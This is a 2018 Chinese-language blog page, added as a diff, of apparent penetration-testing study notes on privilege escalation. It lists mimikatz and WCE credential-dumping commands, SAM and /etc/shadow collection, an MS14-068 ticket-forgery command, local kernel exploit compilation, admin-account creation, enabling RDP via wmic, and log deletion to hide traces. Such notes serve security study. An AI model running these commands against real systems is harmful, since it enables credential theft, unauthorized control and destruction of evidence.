@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="提权本地提权 已实现本地低权限账号登陆 远程溢出 直接获得账号密码   希望获取更高权限 实现对目标进一步控制   系统账号之间权限隔离 操作系统安全的基础 用户空间 内核空间   系统账号 用户账号登陆时获取权限令牌 服务账号无需用户登陆已在后台启动服务   Windows user Administrator System   Linux User Root    Windows system">
+<meta property="og:type" content="article">
+<meta property="og:title" content="提权">
+<meta property="og:url" content="http://yoursite.com/2018/03/21/提权/index.html">
+<meta property="og:site_name" content="Chace Blog">
+<meta property="og:description" content="提权本地提权 已实现本地低权限账号登陆 远程溢出 直接获得账号密码   希望获取更高权限 实现对目标进一步控制   系统账号之间权限隔离 操作系统安全的基础 用户空间 内核空间   系统账号 用户账号登陆时获取权限令牌 服务账号无需用户登陆已在后台启动服务   Windows user Administrator System   Linux User Root    Windows system">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-03-21T04:23:32.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="提权">
+<meta name="twitter:description" content="提权本地提权 已实现本地低权限账号登陆 远程溢出 直接获得账号密码   希望获取更高权限 实现对目标进一步控制   系统账号之间权限隔离 操作系统安全的基础 用户空间 内核空间   系统账号 用户账号登陆时获取权限令牌 服务账号无需用户登陆已在后台启动服务   Windows user Administrator System   Linux User Root    Windows system">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>提权</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/03/26/802-11-1/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/03/19/漏洞后利用阶段/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/03/21/提权/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/03/21/提权/&text=提权"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/03/21/提权/&title=提权"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/03/21/提权/&is_video=false&description=提权"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=提权&body=Check out this article: http://yoursite.com/2018/03/21/提权/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/03/21/提权/&title=提权"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/03/21/提权/&title=提权"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/03/21/提权/&title=提权"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/03/21/提权/&title=提权"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/03/21/提权/&name=提权&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#提权"><span class="toc-number">1.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#本地提权"><span class="toc-number">1.0.1.</span> <span class="toc-text">本地提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注入进程提权"><span class="toc-number">1.0.2.</span> <span class="toc-text">注入进程提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#抓包嗅探"><span class="toc-number">1.0.3.</span> <span class="toc-text">抓包嗅探</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#键盘记录"><span class="toc-number">1.0.4.</span> <span class="toc-text">键盘记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#本地缓存密码"><span class="toc-number">1.0.5.</span> <span class="toc-text">本地缓存密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows身份认证"><span class="toc-number">1.0.6.</span> <span class="toc-text">Windows身份认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用漏洞提权"><span class="toc-number">1.0.7.</span> <span class="toc-text">利用漏洞提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用配置不当提权"><span class="toc-number">1.0.8.</span> <span class="toc-text">利用配置不当提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#基本信息收集"><span class="toc-number">1.0.9.</span> <span class="toc-text">基本信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#收集敏感数据"><span class="toc-number">1.0.10.</span> <span class="toc-text">收集敏感数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#隐藏痕迹"><span class="toc-number">1.0.11.</span> <span class="toc-text">隐藏痕迹</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        提权
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Chace Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-03-21T04:23:07.000Z" itemprop="datePublished">2018-03-21</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h4 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h4><ul>
+<li>已实现本地低权限账号登陆<ul>
+<li>远程溢出</li>
+<li>直接获得账号密码</li>
+</ul>
+</li>
+<li>希望获取更高权限<ul>
+<li>实现对目标进一步控制</li>
+</ul>
+</li>
+<li>系统账号之间权限隔离<ul>
+<li>操作系统安全的基础</li>
+<li>用户空间</li>
+<li>内核空间</li>
+</ul>
+</li>
+<li>系统账号<ul>
+<li>用户账号登陆时获取权限令牌</li>
+<li>服务账号无需用户登陆已在后台启动服务</li>
+</ul>
+</li>
+<li>Windows<ul>
+<li>user</li>
+<li>Administrator</li>
+<li>System</li>
+</ul>
+</li>
+<li>Linux<ul>
+<li>User</li>
+<li>Root </li>
+</ul>
+</li>
+<li>Windows system账号<ul>
+<li>系统设置管理功能</li>
+<li>SysInternal Suite<ul>
+<li><a href="https://technet.microsoft.com/en-us/sysinternals/bb545027" target="_blank" rel="noopener">https://technet.microsoft.com/en-us/sysinternals/bb545027</a></li>
+<li>psexec -i -s -d taskmgr</li>
+</ul>
+</li>
+<li><code>at 19:39 /interactive cmd</code> Win XP Win 2003</li>
+<li><code>sc Create syscmd binPath= &quot;cmd /K start&quot; type=own type=interact</code></li>
+<li><code>sc start syscmd</code> </li>
+</ul>
+</li>
+</ul>
+<h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4><ul>
+<li>隐蔽痕迹</li>
+<li>pinjector.exe<ul>
+<li><code>http://www.tarasco.org/security/Process_Injector/</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="抓包嗅探"><a href="#抓包嗅探" class="headerlink" title="抓包嗅探"></a>抓包嗅探</h4><ul>
+<li>Windows<ul>
+<li>Wireshark</li>
+<li>Omnipeek</li>
+<li>commview</li>
+<li>Sniffpass</li>
+</ul>
+</li>
+<li>Linux</li>
+<li><ul>
+<li>Tcpdump</li>
+<li>Wireshark</li>
+<li>Dsniff</li>
+</ul>
+</li>
+</ul>
+<h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><ul>
+<li>Keylogger</li>
+<li>木马窃取</li>
+</ul>
+<h4 id="本地缓存密码"><a href="#本地缓存密码" class="headerlink" title="本地缓存密码"></a>本地缓存密码</h4><ul>
+<li>浏览器缓存的密码</li>
+<li><ul>
+<li>IE浏览器</li>
+<li>Firefox</li>
+</ul>
+</li>
+<li>网络密码</li>
+<li>无线密码</li>
+<li><a href="http://www.nirsoft.net" target="_blank" rel="noopener">http://www.nirsoft.net</a></li>
+<li>Dump SAM</li>
+<li><ul>
+<li>Pwdump</li>
+<li>/usr/share/windows-binaries/fgdump/</li>
+<li>ophcrack</li>
+</ul>
+</li>
+</ul>
+<h4 id="Windows身份认证"><a href="#Windows身份认证" class="headerlink" title="Windows身份认证"></a>Windows身份认证</h4><p>WINLOGON.EXE — LSA AUTH API(LSASRV.DLL) — MSV1_0.DLL(NTLM AUTH PKG)</p>
+<p>WCE(Windows Credential Editor) 内存读取信息</p>
+<ul>
+<li>/usr/share/wce</li>
+<li>需要管理员权限</li>
+<li><code>wce-universal.exe -l / -lv</code></li>
+<li><code>wce-universal.exe -w</code></li>
+<li>从内存读取LM/NTLM hash</li>
+<li>Digest Authentication Package</li>
+<li>NTLM Security Package</li>
+<li>Kerberos Security Package</li>
+<li>防止WCE攻击</li>
+<li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</li>
+</ul>
+<p>其他工具</p>
+<ul>
+<li>pwddump localhost</li>
+<li>fgdump</li>
+<li>mimikatz</li>
+<li><ul>
+<li>privilege::debug #提升权限</li>
+<li>sekurlsa::logonPasswords</li>
+</ul>
+</li>
+</ul>
+<h4 id="利用漏洞提权"><a href="#利用漏洞提权" class="headerlink" title="利用漏洞提权"></a>利用漏洞提权</h4><ul>
+<li>Ms11-080</li>
+<li>Kb2592799</li>
+<li><ul>
+<li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li>
+</ul>
+</li>
+<li>Pyinstaller</li>
+<li><ul>
+<li><a href="https://pypi.python.org/pypi/PyInstaller/2.1" target="_blank" rel="noopener">https://pypi.python.org/pypi/PyInstaller/2.1</a></li>
+</ul>
+</li>
+<li>Pywin32</li>
+<li><ul>
+<li><a href="http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/" target="_blank" rel="noopener">http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/</a></li>
+</ul>
+</li>
+<li>MS11-046</li>
+<li><ul>
+<li>DoS</li>
+</ul>
+</li>
+<li>MS14-068</li>
+<li>库</li>
+<li><ul>
+<li><a href="https://github.com/bidord/pykek" target="_blank" rel="noopener">https://github.com/bidord/pykek</a></li>
+</ul>
+</li>
+<li>ms14-068.py -u <a href="mailto:user@lab.com" target="_blank" rel="noopener">user@lab.com</a> -s userSID -d dc.lab.com</li>
+<li>拷贝 <a href="mailto:TGT_user1@lab.com.ccache" target="_blank" rel="noopener">TGT_user1@lab.com.ccache</a> 到Windows系统</li>
+<li>本地管理员登陆</li>
+<li><ul>
+<li>mimikatz.exe log “kerberos::ptc <a href="mailto:TGT_user@lab.com.ccache" target="_blank" rel="noopener">TGT_user@lab.com.ccache</a>“ exit</li>
+</ul>
+</li>
+<li>Ubuntu 11.10</li>
+<li><ul>
+<li><a href="http://old-releases.ubuntu.com/releases/11.10/" target="_blank" rel="noopener">http://old-releases.ubuntu.com/releases/11.10/</a></li>
+</ul>
+</li>
+<li>gcc</li>
+<li><ul>
+<li>sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc</li>
+<li>gcc 18411.c -o exp</li>
+</ul>
+</li>
+<li>CVE-2012-0056</li>
+<li><ul>
+<li>/proc/pid/mem</li>
+<li>kernels&gt;=2.6.39</li>
+<li><a href="http://blog.zx2c4.com/749" target="_blank" rel="noopener">http://blog.zx2c4.com/749</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a>利用配置不当提权</h4><ul>
+<li>与漏洞提权相比 更常用的方法</li>
+<li><ul>
+<li>企业环境</li>
+<li>补丁更新的全部已经安装</li>
+<li>输入变量过滤之外更值得研发关注的安全隐患</li>
+<li>以system权限启动</li>
+<li>NTFS权限允许users修改删除</li>
+</ul>
+</li>
+<li>icacls</li>
+<li><ul>
+<li>icacls c:\windows*.exe /save perm /T</li>
+<li>i586-mingw32msvc-gcc -o admin.exe</li>
+</ul>
+</li>
+<li>Find</li>
+<li><ul>
+<li>find / -perm 777 -exec ls -l {} \;</li>
+</ul>
+</li>
+<li>应用系统的配置文件</li>
+<li><ul>
+<li>应用连接数据库的配置文件</li>
+<li>后台服务运行账号</li>
+</ul>
+</li>
+</ul>
+<h4 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h4><ul>
+<li><p>Linux</p>
+</li>
+<li><ul>
+<li>/etc/resolv.conf</li>
+<li>/etc/passwd</li>
+<li>/etc/shadow</li>
+<li>whoami, who -a</li>
+<li>ifconfig -a, iptables -L -n, ifconfig -a, netstat -r</li>
+<li>uname -a. ps aux</li>
+<li>dpkg -l | head</li>
+</ul>
+</li>
+<li><p>Windows</p>
+</li>
+<li><ul>
+<li>ipconfig /all, ipconfig /displaydns, netstat -bnao , netstat -r</li>
+<li>net view, net view /domain</li>
+<li>net user /domain, net user %username% /domain</li>
+<li>net accounts, net share</li>
+<li>net locakgroup administrators username /add</li>
+<li>net group “Domain Controllers” /domain</li>
+<li>net share name$=C:\/unlimited</li>
+<li>net user username /active:yes /domain</li>
+</ul>
+</li>
+<li><p>WMIC(Windows Management Inustrumentation)</p>
+<p>• wmic nicconfig get ipaddress,macaddress<br>• wmic computersystem get username<br>• wmic netlogin get name,lastlogon<br>• wmic process get caption, executablepath,commandline<br>• wmic process where name=“calc.exe” call terminate<br>• wmic os get name,servicepackmajorversion<br>• wmic product get name,version<br>• wmic product where name=“name” call uninstall /nointeractive<br>• wmic share get /ALL<br>• wmic /node:”machinename” path Win32_TerminalServiceSetting where<br>AllowTSConnections=”0” call SetAllowTSConnections “1“<br>• wmic nteventlog get path,filename, writeable</p>
+</li>
+</ul>
+<h4 id="收集敏感数据"><a href="#收集敏感数据" class="headerlink" title="收集敏感数据"></a>收集敏感数据</h4><ul>
+<li>商业信息</li>
+<li>系统信息</li>
+<li>Linux</li>
+<li><ul>
+<li>/etc; /usr/local/etc</li>
+<li>/etc/password; /etc/shadow</li>
+<li>.ssh .gnupg 公私密钥</li>
+<li>The e-mail and data files</li>
+<li>业务数据库； 身份认证服务器数据库</li>
+<li>/tmp</li>
+</ul>
+</li>
+<li>Windows</li>
+<li><ul>
+<li>SAM数据库；注册表文件</li>
+<li>%SYSTEMROOT%\repair\SAM</li>
+<li>%SYSTEMROOT%\System32\config\RegBack\SAM</li>
+<li>业务数据库；身份认证数据库</li>
+<li>临时文件目录</li>
+<li>UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\</li>
+</ul>
+</li>
+</ul>
+<h4 id="隐藏痕迹"><a href="#隐藏痕迹" class="headerlink" title="隐藏痕迹"></a>隐藏痕迹</h4><ul>
+<li>禁止在登陆界面显示新建账号</li>
+<li>REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows<br>NT\CurrentVersion\WinLogon\SpecialAccounts\UserList” /v uname /T<br>REG_DWORD /D 0</li>
+<li>del %WINDIR%*.log /a/s/q/f</li>
+<li>History</li>
+<li>日志</li>
+<li><ul>
+<li>auth.log / secure</li>
+<li>btmp / wtmp</li>
+<li>lastlog /faillog</li>
+</ul>
+</li>
+<li>其他日志和HIDS等</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#提权"><span class="toc-number">1.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#本地提权"><span class="toc-number">1.0.1.</span> <span class="toc-text">本地提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注入进程提权"><span class="toc-number">1.0.2.</span> <span class="toc-text">注入进程提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#抓包嗅探"><span class="toc-number">1.0.3.</span> <span class="toc-text">抓包嗅探</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#键盘记录"><span class="toc-number">1.0.4.</span> <span class="toc-text">键盘记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#本地缓存密码"><span class="toc-number">1.0.5.</span> <span class="toc-text">本地缓存密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows身份认证"><span class="toc-number">1.0.6.</span> <span class="toc-text">Windows身份认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用漏洞提权"><span class="toc-number">1.0.7.</span> <span class="toc-text">利用漏洞提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用配置不当提权"><span class="toc-number">1.0.8.</span> <span class="toc-text">利用配置不当提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#基本信息收集"><span class="toc-number">1.0.9.</span> <span class="toc-text">基本信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#收集敏感数据"><span class="toc-number">1.0.10.</span> <span class="toc-text">收集敏感数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#隐藏痕迹"><span class="toc-number">1.0.11.</span> <span class="toc-text">隐藏痕迹</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/03/21/提权/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/03/21/提权/&text=提权"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/03/21/提权/&title=提权"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/03/21/提权/&is_video=false&description=提权"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=提权&body=Check out this article: http://yoursite.com/2018/03/21/提权/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/03/21/提权/&title=提权"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/03/21/提权/&title=提权"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/03/21/提权/&title=提权"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/03/21/提权/&title=提权"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/03/21/提权/&name=提权&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 jsmhny
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
